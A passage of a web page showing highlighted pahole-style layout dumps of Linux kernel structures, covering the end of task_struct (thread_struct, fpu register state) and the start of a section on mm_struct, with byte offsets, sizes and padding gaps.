</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rethooks</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5328      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5328      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5336      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">l1d_flush_kill</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 32-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5376      |  4416 */</span>    <span class="k">struct</span> <span class="n">thread_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5376      |    24 */</span>        <span class="k">struct</span> <span class="n">desc_struct</span> <span class="n">tls_array</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5400      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">sp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5408      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">es</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5410      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">ds</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5412      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">fsindex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5414      |     2 */</span>        <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">gsindex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5416      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">fsbase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5424      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">gsbase</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5432      |    32 */</span>        <span class="k">struct</span> <span class="n">perf_event</span> <span class="o">*</span><span class="n">ptrace_bps</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5464      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">virtual_dr6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5472      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ptrace_dr7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5480      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cr2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5488      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">trap_nr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5496      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">error_code</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5504      |     8 */</span>        <span class="k">struct</span> <span class="n">io_bitmap</span> <span class="o">*</span><span class="n">io_bitmap</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5512      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iopl_emul</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5520: 0   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">iopl_warn</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5520: 1   |     4 */</span>        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">sig_on_uaccess_err</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  3-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5524      |     4 */</span>        <span class="n">u32</span> <span class="n">pkru</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 40-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5568      |  4224 */</span>        <span class="k">struct</span> <span class="n">fpu</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5568      |     4 */</span>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">last_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5576      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">avx512_timestamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5584      |     8 */</span>            <span class="k">struct</span> <span class="n">fpstate</span> <span class="o">*</span><span class="n">fpstate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5592      |     8 */</span>            <span class="k">struct</span> <span class="n">fpstate</span> <span class="o">*</span><span class="n">__task_fpstate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5600      |    16 */</span>            <span class="k">struct</span> <span class="n">fpu_state_perm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5600      |     8 */</span>                <span class="n">u64</span> <span class="n">__state_perm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5608      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__state_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5612      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__user_state_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">perm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5616      |    16 */</span>            <span class="k">struct</span> <span class="n">fpu_state_perm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5616      |     8 */</span>                <span class="n">u64</span> <span class="n">__state_perm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5624      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__state_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5628      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__user_state_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">guest_perm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5632      |  4160 */</span>            <span class="k">struct</span> <span class="n">fpstate</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5632      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5636      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">user_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5640      |     8 */</span>                <span class="n">u64</span> <span class="n">xfeatures</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5648      |     8 */</span>                <span class="n">u64</span> <span class="n">user_xfeatures</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5656      |     8 */</span>                <span class="n">u64</span> <span class="n">xfd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5664: 0   |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">is_valloc</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5664: 1   |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">is_guest</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5664: 2   |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">is_confidential</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5664: 3   |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_use</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 31-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |  4096 */</span>                <span class="k">union</span> <span class="n">fpregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*               112 */</span>                    <span class="k">struct</span> <span class="n">fregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |     4 */</span>                        <span class="n">u32</span> <span class="n">cwd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5700      |     4 */</span>                        <span class="n">u32</span> <span class="n">swd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     4 */</span>                        <span class="n">u32</span> <span class="n">twd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5708      |     4 */</span>                        <span class="n">u32</span> <span class="n">fip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     4 */</span>                        <span class="n">u32</span> <span class="n">fcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5716      |     4 */</span>                        <span class="n">u32</span> <span class="n">foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5720      |     4 */</span>                        <span class="n">u32</span> <span class="n">fos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5724      |    80 */</span>                        <span class="n">u32</span> <span class="n">st_space</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5804      |     4 */</span>                        <span class="n">u32</span> <span class="n">status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                               <span class="cm">/* total size (bytes):  112 */</span>
</span></span><span class="line"><span class="cl">                                           <span class="p">}</span> <span class="n">fsave</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*               512 */</span>                    <span class="k">struct</span> <span class="n">fxregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |     2 */</span>                        <span class="n">u16</span> <span class="n">cwd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5698      |     2 */</span>                        <span class="n">u16</span> <span class="n">swd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5700      |     2 */</span>                        <span class="n">u16</span> <span class="n">twd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5702      |     2 */</span>                        <span class="n">u16</span> <span class="n">fop</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |    16 */</span>                        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                16 */</span>                            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     8 */</span>                                <span class="n">u64</span> <span class="n">rip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     8 */</span>                                <span class="n">u64</span> <span class="n">rdp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                16 */</span>                            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     4 */</span>                                <span class="n">u32</span> <span class="n">fip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5708      |     4 */</span>                                <span class="n">u32</span> <span class="n">fcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     4 */</span>                                <span class="n">u32</span> <span class="n">foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5716      |     4 */</span>                                <span class="n">u32</span> <span class="n">fos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  8-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                               <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5720      |     4 */</span>                        <span class="n">u32</span> <span class="n">mxcsr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5724      |     4 */</span>                        <span class="n">u32</span> <span class="n">mxcsr_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5728      |   128 */</span>                        <span class="n">u32</span> <span class="n">st_space</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5856      |   256 */</span>                        <span class="n">u32</span> <span class="n">xmm_space</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6112      |    48 */</span>                        <span class="n">u32</span> <span class="n">padding</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6160      |    48 */</span>                        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                48 */</span>                            <span class="n">u32</span> <span class="n">padding1</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                48 */</span>                            <span class="n">u32</span> <span class="n">sw_reserved</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                   <span class="cm">/* total size (bytes):   48 */</span>
</span></span><span class="line"><span class="cl">                                               <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                               <span class="cm">/* total size (bytes):  512 */</span>
</span></span><span class="line"><span class="cl">                                           <span class="p">}</span> <span class="n">fxsave</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*               136 */</span>                    <span class="k">struct</span> <span class="n">swregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |     4 */</span>                        <span class="n">u32</span> <span class="n">cwd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5700      |     4 */</span>                        <span class="n">u32</span> <span class="n">swd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     4 */</span>                        <span class="n">u32</span> <span class="n">twd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5708      |     4 */</span>                        <span class="n">u32</span> <span class="n">fip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     4 */</span>                        <span class="n">u32</span> <span class="n">fcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5716      |     4 */</span>                        <span class="n">u32</span> <span class="n">foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5720      |     4 */</span>                        <span class="n">u32</span> <span class="n">fos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5724      |    80 */</span>                        <span class="n">u32</span> <span class="n">st_space</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5804      |     1 */</span>                        <span class="n">u8</span> <span class="n">ftop</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5805      |     1 */</span>                        <span class="n">u8</span> <span class="n">changed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5806      |     1 */</span>                        <span class="n">u8</span> <span class="n">lookahead</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5807      |     1 */</span>                        <span class="n">u8</span> <span class="n">no_update</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5808      |     1 */</span>                        <span class="n">u8</span> <span class="n">rm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5809      |     1 */</span>                        <span class="n">u8</span> <span class="n">alimit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5816      |     8 */</span>                        <span class="k">struct</span> <span class="n">math_emu_info</span> <span class="o">*</span><span class="n">info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5824      |     4 */</span>                        <span class="n">u32</span> <span class="n">entry_eip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                               <span class="cm">/* total size (bytes):  136 */</span>
</span></span><span class="line"><span class="cl">                                           <span class="p">}</span> <span class="n">soft</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*               576 */</span>                    <span class="k">struct</span> <span class="n">xregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |   512 */</span>                        <span class="k">struct</span> <span class="n">fxregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |     2 */</span>                            <span class="n">u16</span> <span class="n">cwd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5698      |     2 */</span>                            <span class="n">u16</span> <span class="n">swd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5700      |     2 */</span>                            <span class="n">u16</span> <span class="n">twd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5702      |     2 */</span>                            <span class="n">u16</span> <span class="n">fop</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |    16 */</span>                            <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                16 */</span>                                <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     8 */</span>                                    <span class="n">u64</span> <span class="n">rip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     8 */</span>                                    <span class="n">u64</span> <span class="n">rdp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                           <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                       <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                16 */</span>                                <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     4 */</span>                                    <span class="n">u32</span> <span class="n">fip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5708      |     4 */</span>                                    <span class="n">u32</span> <span class="n">fcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     4 */</span>                                    <span class="n">u32</span> <span class="n">foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5716      |     4 */</span>                                    <span class="n">u32</span> <span class="n">fos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                           <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                       <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  8-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5720      |     4 */</span>                            <span class="n">u32</span> <span class="n">mxcsr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5724      |     4 */</span>                            <span class="n">u32</span> <span class="n">mxcsr_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5728      |   128 */</span>                            <span class="n">u32</span> <span class="n">st_space</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5856      |   256 */</span>                            <span class="n">u32</span> <span class="n">xmm_space</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6112      |    48 */</span>                            <span class="n">u32</span> <span class="n">padding</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6160      |    48 */</span>                            <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                48 */</span>                                <span class="n">u32</span> <span class="n">padding1</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                48 */</span>                                <span class="n">u32</span> <span class="n">sw_reserved</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                       <span class="cm">/* total size (bytes):   48 */</span>
</span></span><span class="line"><span class="cl">                                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                   <span class="cm">/* total size (bytes):  512 */</span>
</span></span><span class="line"><span class="cl">                                               <span class="p">}</span> <span class="n">i387</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6208      |    64 */</span>                        <span class="k">struct</span> <span class="n">xstate_header</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6208      |     8 */</span>                            <span class="n">u64</span> <span class="n">xfeatures</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6216      |     8 */</span>                            <span class="n">u64</span> <span class="n">xcomp_bv</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6224      |    48 */</span>                            <span class="n">u64</span> <span class="n">reserved</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                   <span class="cm">/* total size (bytes):   64 */</span>
</span></span><span class="line"><span class="cl">                                               <span class="p">}</span> <span class="n">header</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6272      |     0 */</span>                        <span class="n">u8</span> <span class="n">extended_state_area</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                               <span class="cm">/* total size (bytes):  576 */</span>
</span></span><span class="line"><span class="cl">                                           <span class="p">}</span> <span class="n">xsave</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*              4096 */</span>                    <span class="n">u8</span> <span class="n">__padding</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 4032-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                           <span class="cm">/* total size (bytes): 4096 */</span>
</span></span><span class="line"><span class="cl">                                       <span class="p">}</span> <span class="n">regs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes): 4160 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">__fpstate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes): 4224 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">fpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes): 4416 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="kr">thread</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes): 9792 */</span>
</span></span><span class="line"><span class="cl">                         <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mm_struct">mm_struct</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* offset    |  size */</span>  <span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">mm_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |  1232 */</span>    <span class="k">struct</span> <span class="p">{</span>
